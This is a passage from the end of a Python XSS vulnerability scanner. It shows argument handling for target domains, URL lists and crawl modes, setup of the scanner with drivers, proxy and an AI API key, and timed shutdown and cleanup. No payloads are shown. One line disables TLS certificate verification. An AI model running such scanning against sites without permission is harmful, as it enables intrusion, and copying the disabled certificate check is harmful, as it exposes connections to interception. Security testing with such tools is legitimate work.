            asyncio.run(fetch_and_clean_urls(args.domain, aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)), stream_output=True))
        else:
            print(f"{RED}[ERROR]{END} Please provide a target domain for --extractquick.{Style.RESET_ALL}")
        stop_animation = True
        sys.exit(0)

    initial_target_urls = []
    if args.list: initial_target_urls = read_target_from_file(args.list)
    elif args.domain: initial_target_urls = [args.domain]
    elif args.url: initial_target_urls = [args.url]
    
    if not initial_target_urls and not (args.deepcrawl or args.crawl):
        print(f"{RED}[ERROR]{END} Please provide a starting URL, a URL list file, or a target domain with a crawl option (--crawl, --deepcrawl).{Style.RESET_ALL}")
        stop_animation = True
        sys.exit(1)

    scanner = AsyncXSSScanner(
        target_urls=initial_target_urls,
        max_depth=args.depth,
        num_drivers=args.drivers,
        ai_api_key=args.ai_key,
        proxy=args.proxy,
        report_file=args.report,
        use_model=args.use_model
    )
    
    timer = None
    try:
        if args.duration:
            timer = threading.Timer(args.duration, terminate_scan_gracefully, args=(None, None))
            timer.start()
        asyncio.run(scanner.run())
    except KeyboardInterrupt:
        logging.info("\nScan interrupted by user.")
    except Exception as e:
        logging.error(f"A fatal error occurred: {e}", exc_info=True)
    finally:
        if timer and timer.is_alive(): timer.cancel()
        if not db_queue.empty():
            db_queue.put("terminate")
            db_queue.join()
        if db_connection: db_connection.close()
        stop_animation = True
        if cursor_thread.is_alive(): cursor_thread.join(timeout=1)
